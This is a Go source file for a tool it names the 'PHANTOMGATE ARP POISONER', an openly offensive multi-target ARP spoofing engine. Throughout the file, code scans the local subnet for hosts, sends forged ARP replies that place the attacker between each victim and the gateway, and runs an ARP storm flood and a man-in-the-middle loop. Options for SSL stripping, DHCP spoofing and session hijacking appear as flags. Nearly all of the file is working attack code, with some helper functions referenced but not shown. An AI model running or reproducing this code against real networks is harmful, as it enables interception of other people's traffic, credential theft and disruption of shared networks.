package arp

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ══════════════════════════════════════════════════════════════════════════════
// PHANTOMGATE ARP POISONER v3.0 — MULTITARGET ATTACK ENGINE
// ══════════════════════════════════════════════════════════════════════════════

type ARPPoisoner struct {
	iface       *net.Interface
	ifaceIndex  int
	attackerIP  net.IP
	attackerMAC net.HardwareAddr
	gatewayIP   net.IP
	gatewayMAC  net.HardwareAddr
	subnet      *net.IPNet

	// Targets
	targets   map[string]*ARPPoisonTarget
	targetsMu sync.RWMutex

	// Attack
	fd       int
	running  bool
	stopChan chan struct{}
	mode     ARPPoisonMode
	interval time.Duration
	jitter   float64

	// Features
	sslStrip      bool
	dhcpSpoof     bool
	sessionHijack bool

	// Stats
	stats *ARPPoisonerStats

	// Components
	cacheManager *ARPCacheManager
	scanner      *NetworkScanner
	sniffer      *ARPSniffer
}

type ARPPoisonerStats struct {
	PacketsSent     int64
	ARPRepliesSent  int64
	ARPRequestsSent int64
	TargetsPoisoned int64
	StartTime       time.Time
}

type ARPPoisonTarget struct {
	IP          net.IP
	MAC         net.HardwareAddr
	Hostname    string
	Vendor      string
	Status      ARPPoisonTargetStatus
	PoisonCount int
	LastSeen    time.Time
	FirstSeen   time.Time
}

type ARPPoisonTargetStatus int

const (
	ARPPoisonStatusUnknown ARPPoisonTargetStatus = iota
	ARPPoisonStatusAlive
	ARPPoisonStatusPoisoned
)

type ARPPoisonMode int

const (
	ARPPoisonModePassive ARPPoisonMode = iota
	ARPPoisonModeSelective
	ARPPoisonModeAggressive
	ARPPoisonModeStealth
	ARPPoisonModeParanoid
)

type ARPPoisonConfig struct {
	Interface     string
	GatewayIP     string
	Targets       []string
	Mode          string
	IntervalMs    int
	Jitter        float64
	SSLEnable     bool
	DHCPEnable    bool
	SessionEnable bool
}

func NewARPPoisoner(cfg ARPPoisonConfig) (*ARPPoisoner, error) {
	// Parse interface
	iface, err := net.InterfaceByName(cfg.Interface)
	if err != nil {
		return nil, fmt.Errorf("interface '%s' not found: %w", cfg.Interface, err)
	}

	// Get attacker IP
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, fmt.Errorf("failed to get interface addresses: %w", err)
	}

	var attackerIP net.IP
	var subnet *net.IPNet
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && ipNet.IP.To4() != nil {
			attackerIP = ipNet.IP.To4()
			subnet = ipNet
			break
		}
	}
	if attackerIP == nil {
		return nil, fmt.Errorf("no IPv4 address found on interface %s", cfg.Interface)
	}

	// Parse gateway
	gatewayIP := net.ParseIP(cfg.GatewayIP).To4()
	if gatewayIP == nil {
		return nil, fmt.Errorf("invalid gateway IP: %s", cfg.GatewayIP)
	}

	// Resolve gateway MAC
	gatewayMAC, err := resolveMACForPoisoner(gatewayIP, cfg.Interface)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve gateway MAC: %w", err)
	}

	// Parse attack mode
	mode := ARPPoisonModeSelective
	switch strings.ToLower(cfg.Mode) {
	case "passive":
		mode = ARPPoisonModePassive
	case "aggressive":
		mode = ARPPoisonModeAggressive
	case "stealth":
		mode = ARPPoisonModeStealth
	case "paranoid":
		mode = ARPPoisonModeParanoid
	}

	// Parse interval
	interval := time.Duration(cfg.IntervalMs) * time.Millisecond
	if interval == 0 {
		interval = 500 * time.Millisecond
	}

	// Open raw socket
	fd, err := openRawSocket(iface.Index)
	if err != nil {
		return nil, fmt.Errorf("failed to open raw socket (requires root): %w", err)
	}

	spooner := &ARPPoisoner{
		iface:       iface,
		ifaceIndex:  iface.Index,
		attackerIP:  attackerIP,
		attackerMAC: iface.HardwareAddr,
		gatewayIP:   gatewayIP,
		gatewayMAC:  gatewayMAC,
		subnet:      subnet,
		targets:     make(map[string]*ARPPoisonTarget),
		fd:          fd,
		stopChan:    make(chan struct{}),
		mode:        mode,
		interval:    interval,
		jitter:      cfg.Jitter,
		sslStrip:    cfg.SSLEnable,
		dhcpSpoof:   cfg.DHCPEnable,
		sessionHijack: cfg.SessionEnable,
		stats: &ARPPoisonerStats{
			StartTime: time.Now(),
		},
	}

	// Initialize components
	spooner.cacheManager, _ = NewARPCacheManager(cfg.Interface)
	spooner.scanner, _ = NewNetworkScanner(cfg.Interface)

	return spooner, nil
}

// ══════════════════════════════════════════════════════════════════════════════
// CORE ATTACK
// ══════════════════════════════════════════════════════════════════════════════

func (p *ARPPoisoner) Start() error {
	p.running = true

	log.Printf("[ARP ADVANCED] Starting on interface %s", p.iface.Name)
	log.Printf("[ARP ADVANCED] Mode: %s", p.getModeName())
	log.Printf("[ARP ADVANCED] Attacker: %s (%s)", p.attackerIP, p.attackerMAC)
	log.Printf("[ARP ADVANCED] Gateway: %s (%s)", p.gatewayIP, p.gatewayMAC)
	log.Printf("[ARP ADVANCED] Features: SSL=%v, DHCP=%v, Session=%v",
		p.sslStrip, p.dhcpSpoof, p.sessionHijack)

	// Discover targets
	go p.discoverTargets()

	// Start attack loops
	go p.poisonLoop()
	go p.sniffLoop()
	go p.statsLoop()

	return nil
}

func (p *ARPPoisoner) Stop() {
	if !p.running {
		return
	}

	p.running = false
	close(p.stopChan)

	log.Printf("[ARP] Restoring ARP caches...")
	p.restoreARP()

	if p.fd >= 0 {
		closeRawSocket(p.fd)
		p.fd = -1
	}

	p.printStats()
	log.Printf("[ARP] Advanced ARP poisoner stopped")
}

func (p *ARPPoisoner) getModeName() string {
	switch p.mode {
	case ARPPoisonModePassive:
		return "PASSIVE"
	case ARPPoisonModeSelective:
		return "SELECTIVE"
	case ARPPoisonModeAggressive:
		return "AGGRESSIVE"
	case ARPPoisonModeStealth:
		return "STEALTH"
	case ARPPoisonModeParanoid:
		return "PARANOID"
	default:
		return "UNKNOWN"
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// TARGET DISCOVERY
// ══════════════════════════════════════════════════════════════════════════════

func (p *ARPPoisoner) discoverTargets() {
	// Initial scan
	p.scanNetwork()

	// Periodic re-scan
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-p.stopChan:
			return
		case <-ticker.C:
			p.scanNetwork()
		}
	}
}

func (p *ARPPoisoner) scanNetwork() {
	if p.subnet == nil {
		return
	}

	log.Printf("[ARP] Scanning network...")

	baseIP := p.subnet.IP.Mask(p.subnet.Mask).To4()
	ones, bits := p.subnet.Mask.Size()
	hostBits := bits - ones
	maxHosts := (1 << hostBits) - 2
	if maxHosts > 254 {
		maxHosts = 254
	}

	for i := 1; i <= maxHosts; i++ {
		ip := make(net.IP, 4)
		copy(ip, baseIP)
		ip[3] = baseIP[3] + byte(i)

		if !p.subnet.Contains(ip) || ip.Equal(p.attackerIP) || ip.Equal(p.gatewayIP) {
			continue
		}

		p.sendARPRequest(ip)
		time.Sleep(2 * time.Millisecond)
	}

	// Wait for replies
	time.Sleep(1 * time.Second)
	p.readARPTable()
}

func (p *ARPPoisoner) readARPTable() {
	data, err := exec.Command("cat", "/proc/net/arp").Output()
	if err != nil {
		return
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines[1:] {
		fields := strings.Fields(line)
		if len(fields) < 4 {
			continue
		}

		ip := net.ParseIP(fields[0]).To4()
		if ip == nil || ip.Equal(p.attackerIP) || ip.Equal(p.gatewayIP) {
			continue
		}

		mac, err := net.ParseMAC(fields[3])
		if err != nil || mac.String() == "00:00:00:00:00:00" {
			continue
		}

		p.targetsMu.Lock()
		if _, exists := p.targets[ip.String()]; !exists {
			p.targets[ip.String()] = &ARPPoisonTarget{
				IP:        ip,
				MAC:       mac,
				Status:    ARPPoisonStatusAlive,
				FirstSeen: time.Now(),
				LastSeen:  time.Now(),
			}
			log.Printf("[ARP DISCOVER] Found host: %s (%s)", ip, mac)
		} else {
			p.targets[ip.String()].LastSeen = time.Now()
		}
		p.targetsMu.Unlock()
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// POISONING ENGINE
// ══════════════════════════════════════════════════════════════════════════════

func (p *ARPPoisoner) poisonLoop() {
	for {
		select {
		case <-p.stopChan:
			return
		default:
		}

		if p.mode != ARPPoisonModePassive {
			p.sendPoisonPackets()
		}

		// Calculate interval with jitter
		jitter := time.Duration(float64(p.interval) * p.jitter * (randFloat64()*2 - 1))
		time.Sleep(p.interval + jitter)
	}
}

func (p *ARPPoisoner) sendPoisonPackets() {
	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	// Send gratuitous ARP to gateway
	p.sendARPReply(p.gatewayIP, broadcastMAC, p.gatewayIP, p.attackerMAC)

	p.targetsMu.RLock()
	for _, target := range p.targets {
		if target.Status == ARPPoisonStatusUnknown {
			continue
		}

		// Tell victim: "gateway is at MY MAC"
		p.sendARPReply(target.IP, target.MAC, p.gatewayIP, p.attackerMAC)

		// Tell gateway: "victim is at MY MAC"
		p.sendARPReply(p.gatewayIP, p.gatewayMAC, target.IP, p.attackerMAC)

		target.PoisonCount++
		atomic.AddInt64(&p.stats.ARPRepliesSent, 2)
	}
	p.targetsMu.RUnlock()
}

func (p *ARPPoisoner) restoreARP() {
	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	for i := 0; i < 10; i++ {
		// Restore gateway
		p.sendARPReply(p.gatewayIP, broadcastMAC, p.gatewayIP, p.gatewayMAC)

		p.targetsMu.RLock()
		for _, target := range p.targets {
			// Restore victim
			p.sendARPReply(target.IP, target.MAC, p.gatewayIP, p.gatewayMAC)
			// Restore gateway entry for victim
			p.sendARPReply(p.gatewayIP, p.gatewayMAC, target.IP, target.MAC)
		}
		p.targetsMu.RUnlock()

		time.Sleep(200 * time.Millisecond)
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// PACKET OPERATIONS
// ══════════════════════════════════════════════════════════════════════════════

func (p *ARPPoisoner) sendARPReply(dstIP net.IP, dstMAC net.HardwareAddr, spoofIP net.IP, spoofMAC net.HardwareAddr) {
	if p.fd < 0 {
		return
	}

	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	if dstMAC == nil {
		dstMAC = broadcastMAC
	}

	ethHeader := buildEthernetHeader(dstMAC, spoofMAC, ETH_P_ARP)
	arpPayload := buildARPReply(spoofMAC, spoofIP.To4(), dstMAC, dstIP.To4())
	packet := append(ethHeader, arpPayload...)

	sendOnSocket(p.fd, p.ifaceIndex, packet)
	atomic.AddInt64(&p.stats.ARPRepliesSent, 1)
}

func (p *ARPPoisoner) sendARPRequest(targetIP net.IP) {
	if p.fd < 0 {
		return
	}

	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	ethHeader := buildEthernetHeader(broadcastMAC, p.attackerMAC, ETH_P_ARP)
	arpPayload := buildARPRequest(p.attackerMAC, p.attackerIP.To4(), targetIP.To4())
	packet := append(ethHeader, arpPayload...)

	sendOnSocket(p.fd, p.ifaceIndex, packet)
	atomic.AddInt64(&p.stats.ARPRequestsSent, 1)
}

// ══════════════════════════════════════════════════════════════════════════════
// SNIFFING
// ══════════════════════════════════════════════════════════════════════════════

func (p *ARPPoisoner) sniffLoop() {
	fd, err := openRawSocket(p.ifaceIndex)
	if err != nil {
		log.Printf("[ARP] Failed to open sniff socket: %v", err)
		return
	}
	defer closeRawSocket(fd)

	buf := make([]byte, 65535)

	for p.running {
		n, _, err := recvFromSocket(fd, buf)
		if err != nil {
			if p.running {
				continue
			}
			return
		}

		if n < 14 {
			continue
		}

		packet := make([]byte, n)
		copy(packet, buf[:n])

		go p.processPacket(packet)
	}
}

func (p *ARPPoisoner) processPacket(packet []byte) {
	if len(packet) < 14 {
		return
	}

	ethType := binary.BigEndian.Uint16(packet[12:14])

	// Handle ARP packets
	if ethType == ETH_P_ARP {
		p.processARPPacket(packet)
		return
	}

	// Handle IP packets
	if ethType == ETH_P_IP {
		p.processIPPacket(packet)
		return
	}
}

func (p *ARPPoisoner) processARPPacket(packet []byte) {
	if len(packet) < 42 {
		return
	}

	arpHeader, err := parseARPHeader(packet[14:])
	if err != nil {
		return
	}

	// ARP Reply - learn MAC addresses
	if arpHeader.Opcode == 2 {
		arpSrcIP := net.IP(arpHeader.SenderIP)
		arpSrcMAC := net.HardwareAddr(arpHeader.SenderMAC)

		p.targetsMu.Lock()
		if target, exists := p.targets[arpSrcIP.String()]; exists {
			target.MAC = arpSrcMAC
			target.LastSeen = time.Now()
			target.Status = ARPPoisonStatusAlive
		} else if !arpSrcIP.Equal(p.attackerIP) && !arpSrcIP.Equal(p.gatewayIP) {
			p.targets[arpSrcIP.String()] = &ARPPoisonTarget{
				IP:        arpSrcIP,
				MAC:       arpSrcMAC,
				Status:    ARPPoisonStatusAlive,
				FirstSeen: time.Now(),
				LastSeen:  time.Now(),
			}
		}
		p.targetsMu.Unlock()
	}
}

func (p *ARPPoisoner) processIPPacket(packet []byte) {
	// Basic IP packet analysis
	if len(packet) < 34 {
		return
	}

	// This is simplified - real implementation would do full analysis
	atomic.AddInt64(&p.stats.PacketsSent, 1)
}

// ══════════════════════════════════════════════════════════════════════════════
// ADVANCED ATTACKS
// ══════════════════════════════════════════════════════════════════════════════

// ARPStorm sends rapid ARP packets to flood the network
func (p *ARPPoisoner) ARPStorm() {
	log.Printf("[ARP] Starting ARP storm...")

	for i := 0; i < 100; i++ {
		broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

		// Flood with gratuitous ARPs
		for j := 0; j < 10; j++ {
			p.sendARPReply(p.gatewayIP, broadcastMAC, p.gatewayIP, p.attackerMAC)
		}

		// Flood targets
		p.targetsMu.RLock()
		for _, target := range p.targets {
			p.sendARPReply(target.IP, target.MAC, p.gatewayIP, p.attackerMAC)
		}
		p.targetsMu.RUnlock()

		time.Sleep(10 * time.Millisecond)
	}

	log.Printf("[ARP] ARP storm complete")
}

// DoubleSpoof performs bidirectional ARP poisoning
func (p *ARPPoisoner) DoubleSpoof(targetIP net.IP) error {
	target, exists := p.targets[targetIP.String()]
	if !exists {
		return fmt.Errorf("target %s not found", targetIP)
	}

	// Tell victim gateway is at our MAC
	p.sendARPReply(target.IP, target.MAC, p.gatewayIP, p.attackerMAC)

	// Tell gateway victim is at our MAC
	p.sendARPReply(p.gatewayIP, p.gatewayMAC, target.IP, p.attackerMAC)

	log.Printf("[ARP] Double spoof: %s ↔ %s", targetIP, p.gatewayIP)
	return nil
}

// MiddleAttack positions attacker as man-in-the-middle
func (p *ARPPoisoner) MiddleAttack() {
	log.Printf("[ARP] Starting MITM attack...")

	for {
		select {
		case <-p.stopChan:
			return
		default:
		}

		p.targetsMu.RLock()
		for _, target := range p.targets {
			if target.Status == ARPPoisonStatusAlive {
				p.DoubleSpoof(target.IP)
			}
		}
		p.targetsMu.RUnlock()

		time.Sleep(p.interval)
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// UTILITY
// ══════════════════════════════════════════════════════════════════════════════

func resolveMACForPoisoner(ip net.IP, iface string) (net.HardwareAddr, error) {
	// Try ARP table first
	mac, err := getARPEntryForPoisoner(ip)
	if err == nil {
		return mac, nil
	}

	// Try arping
	mac, err = arpingResolveForPoisoner(ip, iface)
	if err == nil {
		return mac, nil
	}

	// Try multiple ARP requests
	for i := 0; i < 5; i++ {
		time.Sleep(200 * time.Millisecond)
		mac, err = getARPEntryForPoisoner(ip)
		if err == nil {
			return mac, nil
		}
	}

	return nil, fmt.Errorf("could not resolve MAC for %s", ip)
}

func getARPEntryForPoisoner(ip net.IP) (net.HardwareAddr, error) {
	data, err := exec.Command("ip", "neighbor", "show", ip.String()).Output()
	if err != nil {
		return nil, err
	}

	output := string(data)
	if !strings.Contains(output, "lladdr") {
		return nil, fmt.Errorf("no ARP entry for %s", ip)
	}

	parts := strings.Fields(output)
	for i, part := range parts {
		if part == "lladdr" && i+1 < len(parts) {
			return net.ParseMAC(parts[i+1])
		}
	}

	return nil, fmt.Errorf("could not parse ARP entry for %s", ip)
}

func arpingResolveForPoisoner(ip net.IP, iface string) (net.HardwareAddr, error) {
	cmd := exec.Command("arping", "-c", "1", "-I", iface, ip.String())
	output, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "reply") {
			parts := strings.Fields(line)
			for _, part := range parts {
				if strings.Contains(part, ":") && len(part) == 17 {
					return net.ParseMAC(part)
				}
			}
		}
	}

	return nil, fmt.Errorf("arping failed for %s", ip)
}

func (p *ARPPoisoner) statsLoop() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-p.stopChan:
			return
		case <-ticker.C:
			p.printStats()
		}
	}
}

func (p *ARPPoisoner) printStats() {
	p.targetsMu.RLock()
	targetCount := len(p.targets)
	poisonedCount := 0
	for _, t := range p.targets {
		if t.Status == ARPPoisonStatusPoisoned {
			poisonedCount++
		}
	}
	p.targetsMu.RUnlock()

	log.Printf("[ARP STATS] Targets: %d | Poisoned: %d | Replies: %d | Requests: %d",
		targetCount, poisonedCount,
		atomic.LoadInt64(&p.stats.ARPRepliesSent),
		atomic.LoadInt64(&p.stats.ARPRequestsSent))
}

func (p *ARPPoisoner) GetTargets() []*ARPPoisonTarget {
	p.targetsMu.RLock()
	defer p.targetsMu.RUnlock()

	targets := make([]*ARPPoisonTarget, 0, len(p.targets))
	for _, t := range p.targets {
		targets = append(targets, t)
	}
	return targets
}

func randFloat64() float64 {
	return float64(time.Now().UnixNano()%10000) / 10000.0
}
